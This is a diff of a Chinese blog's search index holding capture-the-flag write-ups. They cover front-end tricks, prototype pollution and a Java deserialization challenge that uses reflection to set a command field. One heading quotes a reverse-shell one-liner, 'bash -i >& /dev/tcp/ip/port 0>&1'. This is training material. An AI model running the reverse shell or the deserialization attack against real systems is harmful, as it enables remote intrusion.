@@ -112,6 +112,7 @@
 <p>解法4： 把按钮类型type删掉，直接输入值</p>
 <p>前端题全在本地，随便改改应该就出了，或者<strong>难道你真是fps高手</strong>？</p>
 <p>解法5： 一眼顶针，发现有两个base64，解码是flag前面一段，再猜猜，又找到一端带&#x3D;&#x3D;的，复制到一起直接出了。（或者js发给gpt4-o，会告诉你flag）</p>
+<p>解法很多不一一说了，前端题都在本地，想办法改改就出了</p>
 <h2 id="我闻到了-巧物-的清香"><a href="#我闻到了-巧物-的清香" class="headerlink" title="我闻到了[巧物]的清香"></a>我闻到了[巧物]的清香</h2><p>世上的道路有很多条，而每个人都有属于自己的那一条</p>
 <p>原型链污染，需要让SECRET_KEY &#x3D;&#x3D; secret_value得到flag</p>
 <p>但是<code>SECRET_KEY</code> 是<code>try to find truth</code>  而<code>secret_value</code>不知道是什么</p>
@@ -127,7 +128,7 @@
 <p>原型链污染就去本地调试，方便看是否污染成功，而且不会搞坏环境</p>
 <h2 id="瑞福莱克珅"><a href="#瑞福莱克珅" class="headerlink" title="瑞福莱克珅"></a>瑞福莱克珅</h2><p>题目描述讲解了需要学习的地方，有很多人来问，也发现了很多疑惑的地方，我就从原理思路去讲解</p>
 <p>首先题目运行环境是无法更改的，你在本地代码里面加入的任何值不会影响服务器环境。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//IndexController    </span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">String</span> <span class="variable">BUPT</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">        String merak= objectInputStream.readUTF();</span><br><span class="line">        <span class="keyword">if</span> (BUPT.equals(<span class="string">&quot;BUPT&quot;</span>) &amp;&amp;  merak.equals(<span class="string">&quot;merak&quot;</span>)) &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//IndexController    </span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">String</span> <span class="variable">BUPT</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">        String merak= objectInputStream.readUTF();</span><br><span class="line">        <span class="keyword">if</span> (BUPT.equals(<span class="string">&quot;BUPT&quot;</span>) &amp;&amp;  merak.equals(<span class="string">&quot;merak&quot;</span>)) &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里我们发现需要传入hexString，并readUTF()两次，readObject()一次，前面两次UTF需要按顺序写入，writeUTF，后面检测两个UTF成功后，调用readObject方法，我们发现题目环境有一个Calc类</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">hasPermission</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.hasPermission) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -137,9 +138,9 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">hasPermission</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>这里两个成员变量都是private，需要<strong>反射</strong>修改hasPermission为true，cmd为反弹shell命令</p>
-<h3 id="为什么不能直接Runtime-getRuntime-exec-bash-i-dev-tcp-ip-port-0-1"><a href="#为什么不能直接Runtime-getRuntime-exec-bash-i-dev-tcp-ip-port-0-1" class="headerlink" title="为什么不能直接Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);"></a>为什么不能直接<code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);</code></h3><p>因为exec的字符串分割问题，这里参考博客吧</p>
+<h3 id="被问到的问题："><a href="#被问到的问题：" class="headerlink" title="被问到的问题："></a>被问到的问题：</h3><h4 id="为什么不能直接Runtime-getRuntime-exec-bash-i-dev-tcp-ip-port-0-1"><a href="#为什么不能直接Runtime-getRuntime-exec-bash-i-dev-tcp-ip-port-0-1" class="headerlink" title="为什么不能直接Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);"></a>为什么不能直接<code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);</code></h4><p>因为exec的字符串分割问题，这里参考博客吧</p>
 <p><a href="https://www.cnblogs.com/BOHB-yunying/p/15523680.html">Java反弹shell小记(个人学习记录) - yunying - 博客园 (cnblogs.com)</a></p>
-<h3 id="为什么把各个类复制进去写的exp得到的hex无法命令执行"><a href="#为什么把各个类复制进去写的exp得到的hex无法命令执行" class="headerlink" title="为什么把各个类复制进去写的exp得到的hex无法命令执行"></a>为什么把各个类复制进去写的exp得到的hex无法命令执行</h3><p>做java题时候一定要本地起个环境调试，通了再打远程，别怕麻烦</p>
+<h4 id="为什么把各个类复制进去写的exp得到的hex无法命令执行"><a href="#为什么把各个类复制进去写的exp得到的hex无法命令执行" class="headerlink" title="为什么把各个类复制进去写的exp得到的hex无法命令执行"></a>为什么把各个类复制进去写的exp得到的hex无法命令执行</h4><p>做java题时候一定要本地起个环境调试，通了再打远程，别怕麻烦</p>
 <p>需要将jar包反编译，自己根据jar包内容新建一个项目，在不影响原本服务文件的情况下，新建一个新的类，去调用，去写exp，还要保证package什么的命名一致</p>
 <img src="https://pic.imgdb.cn/item/66ee33e9f21886ccc0cf7425.jpg" style="zoom:67%;" />
 
@@ -255,6 +256,17 @@
       </categories>
       <tags>
         <tag>一些想法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>做题记录</title>
+    <url>/post/java-wp.html</url>
+    <content><![CDATA[<h2 id="长城杯Baby（jdbc）"><a href="#长城杯Baby（jdbc）" class="headerlink" title="长城杯Baby（jdbc）"></a>长城杯Baby（jdbc）</h2>]]></content>
+      <categories>
+        <category>囊萤夜读</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
       </tags>
   </entry>
 </search>
